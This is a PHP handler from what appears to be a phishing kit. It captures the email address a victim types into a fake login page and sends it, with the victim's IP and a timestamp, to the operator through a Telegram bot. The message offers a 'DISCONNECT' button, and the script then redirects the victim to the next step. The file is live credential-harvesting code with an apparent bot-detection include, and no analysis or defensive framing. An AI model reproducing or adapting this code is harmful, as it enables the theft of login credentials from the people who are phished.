<?php
 ini_set('display_errors', '1');
 ini_set('display_startup_errors', '1');
 error_reporting(E_ALL);
session_start();
ob_start();
require_once('../../config.php');
include_once('../../includes/php/detect.php');
$_SESSION['Email'] = $_POST['Email'];


header('Content-Type: application/json');   


if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $_SESSION['unique_id'] = bin2hex(random_bytes(16));
	$adddate=date("D M d, Y g:i a");

    include_once('../../includes/php/bot_api.php');



    $_SESSION['Email'] = $_POST['Email'];
$buttons = array(
    'inline_keyboard' => array(
        array(
            array('text' => 'DISCONNECT 📴', 'callback_data' => $_SESSION['unique_id'] . ' disconnect'),
        ),
    )
);
$message = '<b>2nd LOGIN from </b><code>'.$_SESSION['user_data']['query'].'</code> <code>'.$_POST['Email'].'</code>

<b>USER ID:</b> <code>'.$_POST['Email'].'</code>
<b>DATE:</b> '.$adddate.'
<b>coder:</b> <b>'.$_SESSION['pria'].$_SESSION['prib'].$_SESSION['pric'].$_SESSION['prid'].'</b>

';
$status = bot_api($message, $buttons);




if ($status['ok'] === 0 || $status['ok'] === false){
    die('{"error":true, "description": "telegram bot api"}');
}else{
    header('location: ../../new.php');
}

}
